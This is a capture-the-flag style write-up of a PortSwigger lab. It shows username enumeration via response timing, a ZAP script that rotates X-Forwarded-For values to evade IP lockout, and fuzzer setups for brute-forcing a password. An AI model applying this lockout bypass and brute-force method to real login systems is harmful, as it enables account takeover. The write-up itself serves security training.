# Username Enumeration via Response Timing

> This writeup follows the OWASP Web Security Testing Guide (WSTG) methodology.

---

## Goal

Enumerate a valid username, brute-force this user's password, then access their account page.

Credentials given: `wiener:peter`

---

## Lab

https://portswigger.net/web-security/authentication/other-mechanisms/lab-username-enumeration-via-response-timing

---

## OWASP Category

A07:2021 – Identification and Authentication Failures

---

## Core Concept

Here the error message is **identical** in every case — no text or byte difference at all. Instead, the vulnerability is in **how long the server takes to respond**.

```
Invalid username  → server returns immediately (no password check needed)
Valid username    → server hashes the password and compares it
                     ↓
                 Hashing takes time → slightly slower response
```

If we send an **extremely long password**, the time difference becomes much more obvious — hashing a long string takes measurably longer than a short one.

---

## Steps to Solve

---

**Step 1 — Confirm Timing Difference**

Submit known valid credentials to see baseline timing:

```
Username: wiener
Password: peter
```

Note response time in ZAP — usually fast since this is the actual correct combo.

Submit an invalid username:
```
Username: invaliduser12345
Password: peter
```

Response time is also fast — no password verification happens.

---

**Step 2 — Amplify the Timing Difference**

Submit a known valid username with a very long password (200+ characters):

```
Username: wiener
Password: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

Response takes noticeably longer because the server hashes this long password before comparing.

<img width="1916" height="213" alt="image" src="https://github.com/user-attachments/assets/52079be6-ccd4-45a3-a610-ed7e81c04423" />

Submit an invalid username with the same long password:
```
Username: invaliduser12345
Password: aaaaa...(same 200+ chars)
```

Response is fast — server rejects before even hashing, since username does not exist.

<img width="1902" height="98" alt="image" src="https://github.com/user-attachments/assets/2b614d56-7d53-4d0b-80bf-3de8e503a521" />

---

**Step 3 — Automating IP Rotation with a ZAP Script**

Before fuzzing usernames or passwords, it's worth setting up IP rotation up front. Brute-forcing either the username list or the password list can mean hundreds of requests, and the target blocks an IP after only a few failed login attempts. Manually changing `X-Forwarded-For` to `1`, `2`, `3`... for every request isn't practical, so instead we write a small ZAP script that automatically increments the header value on every outgoing request, ensuring the IP-based block never has a chance to trigger — for username enumeration or password brute-forcing later.

First, confirm the header is honored at all by manually adding it to a request:

```
X-Forwarded-For: 1
```

<img width="1709" height="418" alt="image" src="https://github.com/user-attachments/assets/30e22f2e-6e41-45b4-9a0b-9f9c9ef51f18" />

It allows this header!

Now automate it:

```
ZAP → Scripts tab → right-click "HttpSender" → New Script…
Engine: Graal.js
Name: RotateXFF
```

```javascript
var counter = 1;// <-- change this to whatever starting IP number you want

function sendingRequest(msg, initiator, helper) {
    msg.getRequestHeader().setHeader("X-Forwarded-For", counter.toString());
    counter++;
}

function responseReceived(msg, initiator, helper) {
    // no action needed
}
```

Save the script, then enable it from the Scripts tree (checkbox or right-click → Enable). From this point on, **every** request ZAP sends — manual or Fuzzer — carries a unique, never-repeated `X-Forwarded-For` value automatically. There's no need to add a payload position on the header itself; the script handles it transparently in the background for every attack from here on.

<!-- Screenshot: Script enabled in Scripts tab, showing counter incrementing in request headers -->

---

**Step 4 — Enumerate Username with ZAP Fuzzer**

```http
POST /login HTTP/1.1

username=§invaliduser§&password=aaaaaaaaa...(200+ chars)
```

Payload: candidate usernames wordlist.

Only one payload position is needed — on `username`. The `RotateXFF` script handles the IP rotation automatically in the background, so the attack can run uninterrupted even across hundreds of usernames.

**Sort results by RTT (Round Trip Time)** — the row with significantly longer RTT = valid username.

| RTT | Meaning |
|-----|---------|
| ~50-100ms | Invalid username |
| ~300-500ms+ | Valid username — server hashed the long password |

<img width="1857" height="144" alt="image" src="https://github.com/user-attachments/assets/ee4d1b63-271d-43e6-b600-dacf2a06811b" />

Valid username found: **ag**

---

**Step 5 — Brute-Force Password**

Now use the found username with normal-length password guesses:

```http
username=ag&password=§invalidpass§
```

Payload: candidate passwords wordlist.

With `RotateXFF` still enabled from Step 3, set up the Fuzzer with a single payload position on `password` only. Load the password wordlist and start the attack — no IP block will interrupt the run.

Filter for the successful login response (`302` redirect / different content).

<img width="1754" height="792" alt="image" src="https://github.com/user-attachments/assets/602f6ac5-9b39-4eef-ab39-f0ffd8d6bce9" />

Password found: **shadow**

---

**Lab Solved**

<img width="1511" height="720" alt="image" src="https://github.com/user-attachments/assets/0799cf99-7fc6-453a-abd5-61d7231887f8" />

---

## Why Long Passwords Amplify Timing Differences

```
Short password (8 chars):
Hash time difference between valid/invalid username ≈ 5-10ms
Hard to detect reliably over network jitter

Long password (200+ chars):
Hash time difference between valid/invalid username ≈ 100-300ms+
Easy to detect clearly even with network noise
```

---

## How This Differs from Previous Labs

| | Lab 1 | Lab 2 | Lab 3 |
|--|--|--|--|
| Detection signal | Response text | Response byte size | **Response time** |
| Difference visibility | Obvious | Subtle (1 char) | Invisible — only timing |
| Amplification needed | No | No | **Yes — long password** |

---

*This writeup is intended for educational purposes only. All techniques documented here were performed on PortSwigger's intentionally vulnerable practice platform. The author does not encourage or condone the use of these methods against any system without explicit written permission. Unauthorized use of these techniques may violate applicable laws and regulations.*
